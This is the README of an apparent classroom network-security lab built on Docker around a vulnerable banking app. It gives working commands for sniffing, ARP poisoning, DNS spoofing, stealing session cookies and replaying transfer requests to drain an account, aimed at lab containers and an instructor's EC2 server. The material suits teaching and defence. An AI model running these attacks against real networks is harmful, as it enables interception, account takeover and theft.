# 🛡️ Network Security Workshop Lab

A hands-on lab environment for learning network traffic interception, analysis, and manipulation.

> ⚠️ **EDUCATIONAL USE ONLY.** These tools and techniques are for authorized learning environments only. Unauthorized network attacks are illegal.

---

## 🗺️ Network Map

```
┌─────────────────────────────────────────────────────┐
│                 Lab Network: 10.0.0.0/24            │
│                                                     │
│   ┌──────────┐     ┌──────────┐     ┌──────────┐   │
│   │  VICTIM  │────▶│  SERVER  │     │   DNS    │   │
│   │ 10.0.0.15│     │ 10.0.0.20│     │ 10.0.0.30│   │
│   │ (Alpine) │     │ (Nginx)  │     │(dnsmasq) │   │
│   └──────────┘     └──────────┘     └──────────┘   │
│        │                ▲                           │
│        │    YOU ATTACK  │                           │
│        │    THIS TRAFFIC│                           │
│        ▼                │                           │
│   ┌─────────────────────────┐                       │
│   │    YOUR KALI MACHINE    │                       │
│   │       10.0.0.10         │                       │
│   │  (tcpdump, arpspoof,    │                       │
│   │   dnsspoof, wireshark)  │                       │
│   └─────────────────────────┘                       │
└─────────────────────────────────────────────────────┘
```

The **Victim** container simulates a user constantly logging in and transferring funds to the **Server**. Your Kali machine joins this network so you can sniff, intercept, and manipulate the traffic.

---

## 🚀 Quick Setup (5 min)

### 1. Install Docker in Kali

```bash
sudo apt update
sudo apt install -y docker.io docker-compose
sudo systemctl start docker
sudo systemctl enable docker

# Add yourself to the docker group (avoids needing sudo for docker commands)
sudo usermod -aG docker $USER
```

> ⚠️ **You must log out and log back in** (or reboot) for the docker group to take effect.
> Until then, prefix docker commands with `sudo` (e.g., `sudo docker compose up -d`).

### 2. Clone and Launch the Lab

```bash
git clone https://github.com/icyclestick/safebank-workshop.git
cd safebank-workshop

# Start the victim network
sudo docker compose up -d

# Connect your Kali to the lab network
sudo ./setup.sh
```

You should see:
```
╔══════════════════════════════════════════════════╗
║   LAB NETWORK READY                              ║
╚══════════════════════════════════════════════════╝

  Your IP (Attacker):  10.0.0.10
  Victim:              10.0.0.15
  Server:              10.0.0.20
  DNS:                 10.0.0.30
```

### 3. Save Your Bridge Interface Name

Many commands in this lab require the name of the Docker bridge interface. The `setup.sh` script already printed it for you in the output:

```
  Bridge Interface:    br-da84093cdd18    ← copy this!
```

Save it to a variable so you don't have to type it every time:

```bash
# Replace with YOUR bridge name from the setup.sh output above
export BRIDGE=br-da84093cdd18
```

> **Can't find it?** You can also look it up without Docker permissions:
> ```bash
> ip link show type bridge
> ```
> Look for the interface that starts with `br-` — that's the one.

> ⚠️ **Important:** Run this `export` command in **every new terminal** you open, or the `$BRIDGE` variable won't be set.

### 4. Verify

```bash
# Can you reach the server?
curl http://10.0.0.20/login

# Can you see victim traffic? (waits for 5 packets then exits)
sudo tcpdump -i $BRIDGE -c 5 host 10.0.0.15
```

---

## 🔬 Lab Exercises

### Lab 1: Packet Sniffing (Topic 27)

**Goal:** Capture and read the victim's HTTP traffic.

```bash
# Sniff all traffic from the victim, show ASCII content
sudo tcpdump -i $BRIDGE -A host 10.0.0.15
```

> **What does this do?**
> - `-i $BRIDGE` — listen on the lab's bridge network interface
> - `-A` — print packet contents in ASCII (so you can read HTTP text)
> - `host 10.0.0.15` — only capture packets to/from the victim's IP

**What to look for:**
- The victim's `GET /login` and `POST /transfer` requests
- `Cookie: session_token=s3cr3t-t0k3n-abc123xyz` in the headers
- `Authorization: Bearer eyJhbGciOiJI...` JWT token
- The JSON body: `{"to":"user2","amount":500}`

> 💡 **Takeaway:** Unencrypted HTTP traffic exposes everything — cookies, tokens, request bodies.

---

### Lab 2: CLI Packet Capture (Topic 33)

**Goal:** Save captured packets to a file for later analysis.

```bash
# Capture 50 packets and save to a file
sudo tcpdump -i $BRIDGE -w capture.pcap -c 50 host 10.0.0.15

# Read the saved capture
tcpdump -r capture.pcap -A | head -100

# You can also open capture.pcap in Wireshark
wireshark capture.pcap &
```

---

### Lab 3: ARP Poisoning (Topic 30)

**Goal:** Position yourself between the victim and server by poisoning their ARP tables.

First, install the tools:
```bash
sudo apt install -y dsniff
```

**Check normal ARP tables:**
```bash
# See who the victim thinks the server is
sudo docker exec lab-victim arp -a
```

**How to read the output:**
```
lab-server... (10.0.0.20) at 02:42:0a:00:00:14 [ether]  on eth0   ← Server's real MAC
?             (10.0.0.1)  at 02:42:84:1a:58:b3 [ether]  on eth0   ← Docker bridge gateway (NOT you!)
lab-dns...    (10.0.0.30) at 02:42:0a:00:00:1e [ether]  on eth0   ← DNS server's real MAC
```

Each line means: *"IP address X has MAC address Y."* Note that `10.0.0.1` is the Docker bridge gateway — **not** your attacker machine (`10.0.0.10`). Your IP doesn't appear here because the victim has no reason to talk to you... yet.

**Launch the attack (2 terminals):**

> Remember to run `export BRIDGE=<your-bridge-name>` in each new terminal!

Terminal 1 — Tell the victim "I am the server":
```bash
sudo arpspoof -i $BRIDGE -t 10.0.0.15 10.0.0.20
```

> **What does this do?**
> - `arpspoof` sends fake ARP replies on the network
> - `-i $BRIDGE` — use the lab bridge interface
> - `-t 10.0.0.15` — target the victim
> - `10.0.0.20` — pretend to be the server
> - The victim's ARP table will now map the server's IP (`10.0.0.20`) to **your** MAC address

Terminal 2 — Tell the server "I am the victim":
```bash
sudo arpspoof -i $BRIDGE -t 10.0.0.20 10.0.0.15
```

> IP forwarding was already enabled by `setup.sh`, so traffic still flows through you transparently.

**Verify it works:**
```bash
# Check the victim's ARP table again — the MAC next to 10.0.0.20 should have CHANGED to YOUR MAC!
sudo docker exec lab-victim arp -a

# Now ALL victim↔server traffic passes through you
sudo tcpdump -i $BRIDGE -A host 10.0.0.15 and host 10.0.0.20
```

> 💡 **Takeaway:** ARP has no authentication. Any device on the LAN can claim to be any other device.

---

### Lab 4: Man-in-the-Middle (Topic 28)

**Goal:** With ARP poisoning active, intercept and read all communication.

This is the payoff from Lab 3. With arpspoof still running:

```bash
# See everything — full HTTP requests/responses between victim and server
sudo tcpdump -i $BRIDGE -A -s0 host 10.0.0.15
```

You should now see **complete** HTTP conversations — request headers, response bodies, cookies, and form data flowing through your machine.

> 💡 **Takeaway:** MitM = Position + Capture. ARP poisoning provides the position, tcpdump provides the capture.

---

### Lab 5: DNS Spoofing (Topic 29)

**Goal:** Redirect the victim's DNS lookups to your machine.

The victim uses `lab-dns` (10.0.0.30) to resolve `workshop.lab` → `10.0.0.20`.

With ARP poisoning still active against the DNS server:

Terminal 1 — Poison the victim↔DNS path:
```bash
sudo arpspoof -i $BRIDGE -t 10.0.0.15 10.0.0.30
```

Terminal 2 — Spoof DNS responses:
```bash
# Create a hosts file pointing workshop.lab to your IP
echo "10.0.0.10 workshop.lab" > /tmp/fakehosts

sudo dnsspoof -i $BRIDGE -f /tmp/fakehosts host 10.0.0.15 and udp port 53
```

**Verify:**
```bash
# From the victim, workshop.lab should now resolve to YOU
sudo docker exec lab-victim nslookup workshop.lab 10.0.0.30
```

> 💡 **Takeaway:** DNS has no built-in authentication. A MitM attacker can forge DNS responses to redirect users anywhere.

---

### Lab 6: Session Hijacking (Topic 31)

**Goal:** Steal a session cookie from captured traffic and use it to impersonate the victim — visually, in a browser.

**Step 1: Find the cookie in your tcpdump capture**

From your tcpdump captures in Labs 1-4, you already saw the victim's session cookie in the HTTP headers:
```
Cookie: session_token=s3cr3t-t0k3n-abc123xyz
```

**Step 2: Verify with curl (quick test)**

```bash
# Use the stolen session cookie to access the transfer page as the victim
curl -v -b "session_token=s3cr3t-t0k3n-abc123xyz" http://10.0.0.20/transfer
```

You should see a `200 OK` response with the transfer page HTML — you're in!

**Step 3: Hijack the session in the browser (visual demo)**

This is the real payoff — you'll see the victim's banking dashboard in your own browser.

1. Open **Firefox** on your Kali machine and go to `http://10.0.0.20/transfer`

2. Open **Developer Tools** — press `F12` (or right-click → Inspect)

3. Go to the **Console** tab and type:
   ```javascript
   document.cookie = "session_token=s3cr3t-t0k3n-abc123xyz";
   ```
   Press Enter. You've just injected the stolen cookie into your browser.

4. **Refresh the page** (`F5`) — you are now browsing as the victim! The server sees your stolen cookie and treats you as the authenticated user.

5. To confirm, go to the **Storage** tab (or **Application** tab in Chromium) → **Cookies** → `http://10.0.0.20`. You should see:
   | Name | Value |
   |------|-------|
   | `session_token` | `s3cr3t-t0k3n-abc123xyz` |

You now have full access to the victim's session — you can see their balance, make transfers, and do anything they can do — **without ever knowing their password**.

> 💡 **Takeaway:** Cookies without `HttpOnly` and `Secure` flags, sent over plain HTTP, are trivially stealable. Anyone on the network can grab them and impersonate the user.

---

### Lab 7: Replay Attacks (Topic 32)

**Goal:** Replay a captured transfer request multiple times.

From the tcpdump output, you captured the transfer request. Replay it:

```bash
# Replay the exact same request 5 times
for i in $(seq 1 5); do
  curl -s -X POST http://10.0.0.20/transfer \
    -b "session_token=s3cr3t-t0k3n-abc123xyz" \
    -H "Content-Type: application/json" \
    -d '{"to":"hacker","amount":500}'
  echo ""
  echo "--- Replay #$i complete ---"
done
```

**Result:** All 5 requests return `200 OK` with success messages. The server processes each one as a new, legitimate transfer.

> 💡 **Takeaway:** Without CSRF tokens, nonces, or timestamp validation, captured requests can be replayed infinitely.

---

## 🧹 Teardown

```bash
# Stop the lab
docker compose down

# Remove images (optional)
docker compose down --rmi all
```

---

## ☁️ Phase 2: Cloud Attack (EC2)

After completing the local labs, pivot to attacking a live cloud-hosted version of the vulnerable app. See [DEPLOY_EC2.md](./DEPLOY_EC2.md) for deployment instructions.

In this phase, we transition from the local sandbox to a live cloud environment. Because this is an online synchronous workshop, participants cannot sniff each other's traffic over the internet. 

Instead, we use a **"Capture The Flag" (CTF) approach**: The instructor captures their own login traffic to the live EC2 server and shares the `.pcap` capture file with the class. Participants then analyze the file to steal the instructor's session and attack the live server!

### Step 1: Instructor — Generate the Target Capture

**The instructor** does this step while sharing their screen:

1. Start **Wireshark** and capture traffic on your internet-facing interface (e.g., `eth0`, `Wi-Fi`).
2. Open a browser, navigate to the deployed EC2 app (`http://<EC2-PUBLIC-IP>`), and log in.
3. Send a transfer of $500 to another user.
4. Stop Wireshark, filter for `http`, and save the captured packets as `instructor_login.pcap`.
5. Upload this `.pcap` file to the workshop chat (Zoom/Teams/Discord).

### Step 2: Participants — Analyze the Capture

**All participants** do this on their own machines:

1. Download the `instructor_login.pcap` file from the chat.
2. Open the file in your own **Wireshark** or run `tcpdump -r instructor_login.pcap -A`.
3. Look for the `POST` requests to `/api/login` or `/api/transfer`.
4. If using Wireshark, right-click the packet → **Follow → HTTP Stream**.
5. Look at the request headers sent by the instructor and find the `Cookie` header:
   ```http
   Cookie: session_token=<THE_INSTRUCTOR'S_TOKEN>
   ```
6. **Copy the token value.** You now have the instructor's live session!

### Step 3: Participants — Session Hijacking

Use the instructor's stolen cookie to access the app as them:

**Option A — Browser (visual):**
1. Open Firefox and go to `http://<EC2-PUBLIC-IP>/dashboard`
2. Press `F12` → **Console** tab
3. Inject the stolen cookie:
   ```javascript
   document.cookie = "session_token=<STOLEN_TOKEN>";
   ```
4. Refresh the page — you're now logged in as the instructor!

**Option B — curl (quick):**
```bash
curl -v -b "session_token=<STOLEN_TOKEN>" http://<EC2-PUBLIC-IP>/api/transfer
```

### Step 5: Participants — Replay Attack

Replay the instructor's transfer request to drain their account:

1. From the Wireshark HTTP Stream in Step 3, find the JSON body of the `/api/transfer` POST (e.g., `{"to":"user2","amount":500}`).
2. Replay it with the stolen token, but change the recipient to yourself:
   ```bash
   curl -s -X POST http://<EC2-PUBLIC-IP>/api/transfer \
     -b "session_token=<STOLEN_TOKEN>" \
     -H "Content-Type: application/json" \
     -d '{"to":"hacker","amount":500}'
   ```
3. **Result:** The server accepts the request! You just transferred the instructor's money to yourself.
4. Try looping it to drain the account completely:
   ```bash
   for i in $(seq 1 5); do
     curl -s -X POST http://<EC2-PUBLIC-IP>/api/transfer \
       -b "session_token=<STOLEN_TOKEN>" \
       -H "Content-Type: application/json" \
       -d '{"to":"hacker","amount":500}'
     echo " ← Replay #$i"
   done
   ```

> 💡 **Why this works:** The instructor's HTTP traffic travels unencrypted over the WiFi. Anyone on the same network can read it. There are no CSRF tokens, no nonces, and no HTTPS — so the captured session can be reused and replayed indefinitely.

---

## 📚 Topics Covered

| Lab | Topic | Concepts |
|-----|-------|----------|
| 1 | Packet Sniffing (27) | Capturing network packets, monitoring traffic |
| 2 | CLI Packet Capture (33) | tcpdump, saving .pcap files |
| 3 | ARP Poisoning (30) | ARP protocol, MAC-IP mapping, traffic redirection |
| 4 | Man-in-the-Middle (28) | Intercepting communication, attacker positioned between endpoints |
| 5 | DNS Spoofing (29) | Fake DNS responses, redirecting to malicious servers |
| 6 | Session Hijacking (31) | Stealing session cookies, taking over sessions |
| 7 | Replay Attacks (32) | Reusing captured packets, impersonation |
